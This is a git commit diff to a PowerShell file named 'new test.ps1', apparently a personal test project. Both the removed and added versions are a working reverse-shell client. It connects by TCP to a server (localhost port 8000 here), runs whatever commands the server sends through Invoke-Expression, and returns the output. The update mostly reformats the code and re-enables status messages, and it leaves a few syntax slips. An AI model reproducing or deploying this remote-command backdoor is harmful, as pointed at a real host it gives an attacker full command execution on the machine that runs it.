41a391f40e73b5df6b8ff21912fb5c75f48c4935
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-10-02 23:53:43 +0300

    Update new test.ps1

--- new test.ps1
+++ new test.ps1
@@ -1,52 +1,50 @@
 
-$client2 = {
-     $address = 'localhost'
-    $port = 8000
- 
-    while ($true) {
-        do {
-            try {
-                #Write-Host "Trying to reach "$address":"$port
-                $client = New-Object System.Net.Sockets.TcpClient($address, $port) 
-                $stream = $client.GetStream()
-                $writer = New-Object System.IO.StreamWriter($stream)
-                $reader = New-Object System.IO.StreamReader($stream)
-                break
-            }
-            catch {
-                Start-Sleep -s 10
-            }
-        } while ($true)
-   
-        #Write-Host "Connected"
-        # Execute commands sent by the server, and return output
+$client2 = $address = 'localhost'
+$port = 8000
+while ($true) {
+    do {
         try {
-            do {
-                $cmd = $reader.ReadLine()
-                if ($cmd -eq 'exit') {
-                    #Write-Host "Exiting"
-                    break
-                }
-               try {
-                    $output = [string](iex $cmd)
-                }
-                catch {
-                    $output = $_.Exception.Message
-                }
-                $writer.WriteLine($output)
-                $writer.Flush()
-            } while($true)
+            Write-Host "Trying to reach "$address":"$port
+            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+            break
         }
         catch {
-            #Write-Host $_.Exception.Message
+            Start-Sleep -s 10
         }
-   
-        # Cleanup
-        $writer.Close()
-        $reader.Close()
-        $stream.Close()
-        $client.Close()
-        }}
+    } while ($true)
+    
+    Write-Host "Connected"
+    # Execute commands sent by the server, and return output
+    try {
+        do {
+            $cmd = $reader.ReadLine()
+            if ($cmd -eq 'exit') {
+                Write-Host "Exiting"
+                break
+            }
+            try {
+                $output = [string](iex $cmd)
+            }
+            catch {
+                $output = $_.Exception.Message
+            }
+            $writer.WriteLine($output)
+            $writer.Flush()
+        } while($true)
+    }
+    catch {
+        Write-Host $_.Exception.Message
+    }
+    
+    # Cleanup
+    $writer.Close()
+    $reader.Close()
+    $stream.Close()
+    $client.Close()
+}}
 
 
 
